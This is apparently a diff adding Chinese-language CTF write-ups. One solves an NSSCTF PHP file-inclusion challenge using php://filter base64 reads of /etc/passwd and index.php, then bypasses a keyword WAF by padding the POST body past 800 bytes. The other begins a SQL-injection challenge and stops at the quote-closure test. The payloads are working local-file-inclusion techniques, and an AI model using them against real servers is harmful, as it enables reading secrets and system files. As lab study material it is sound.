@@ -159,3 +159,72 @@ w22m::__destruct()（对象销毁）→ echo w33m 对象 → 触发 w33m::__toSt
 ![alt text](image-29.png)
 得到flag
 ![alt text](image-30.png)
+
+
+## [鹏城杯 2022]简单包含
+>题目url：https://www.nssctf.cn/problem/2422
+
+打开题目是一段php代码
+
+```php
+ <?php 
+highlight_file(__FILE__);
+include($_POST["flag"]);
+//flag in /var/www/html/flag.php; 
+```
+根据他的意识直接post传参
+`
+flag=/var/www/html/flag.php 
+`
+![alt text](image-55.png)
+提示触发了waf说明被保护了，要绕过waf
+用伪协议读看看
+```
+flag=php://filter/read=convert.base64-encode/resource=/etc/passwd
+```
+![alt text](image-56.png)
+出现一段base64代码，解码之后没有有用的信息。
+但是这说明了php://filter是有用的，可能是flag被过滤了
+试试index.php
+
+![alt text](image-57.png)
+这次得到的base64解码之后是一段php代码
+```php
+<?php
+
+$path = $_POST["flag"];
+
+if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
+    echo 'nssctf waf!';
+} else {
+    @include($path);
+}
+?>
+```
+这段代码表明了过滤掉flag字符，但是注意到还有一句
+```
+file_get_contents('php://input') < 800
+```
+说明可以让输入的东西大于800字节就可以跳出这条条件
+post传参如下
+```
+yjk=jk(800个字符)&flag=php://filter/read=convert.base64-encode/resource=flag.php
+```
+![alt text](image-58.png)
+得到一段base64码解码得到flag
+![alt text](image-59.png)
+
+## [SWPUCTF 2021 新生赛]sql
+>url:https://www.nssctf.cn/problem/442
+
+![alt text](image-61.png)
+打开题目有一句提示
+注意到传参是通过wllm,但是还有waf，waf可以防治sql注入
+
+先判度一下闭合方式
+![alt text](image-62.png)
+![alt text](image-63.png)
+说明是单引号闭合
+
+然后测试行回显数
+
